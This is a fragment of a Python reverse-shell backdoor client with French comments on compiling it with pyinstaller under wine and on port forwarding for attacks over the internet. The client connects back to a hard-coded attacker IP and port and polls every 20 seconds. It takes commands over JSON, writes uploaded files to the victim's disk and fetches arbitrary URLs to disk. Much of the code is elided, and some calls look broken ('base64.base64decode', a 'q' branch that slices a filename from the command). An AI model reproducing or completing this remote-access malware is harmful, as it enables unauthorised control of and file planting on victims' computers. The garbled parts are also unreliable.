...
import sys
import time
import requests #get url et son contenu qu'on pourra ecrire dans un fichier, il faut rajouter la librairie a pyinstaller : wine path/.wine/drive_c.Python27/python.exe -m pip install requests

iptoconnect = "192.168.1.46" #si on fait une attaque a travers internet avec port forward, il faut l'ip publique du routeur, et le port forward du routeur
porttoconnect = 54321
...
def reliable_recv():
	...
	while True:
		try:
			...
			return json.load(data) #une fois que c bon y a tout dans data
		except ValueError:
...
def download(url):
	...
	with open(file_name, "wb") as out_file:
		out_file.write(get_response.content) #write le contenu du fichier telecharge

def connection():
	while True:
		time.sleep(20) #dort 20s
		try:
	...
	while True:
		...
		if command == 'q':
			...
			with open(command[7:], "wb") as fin: #write bytes
				...
				fin.write(base64.base64decode(file_data))
		elif command[:3] == "get":
			try:
				download(command[4:])
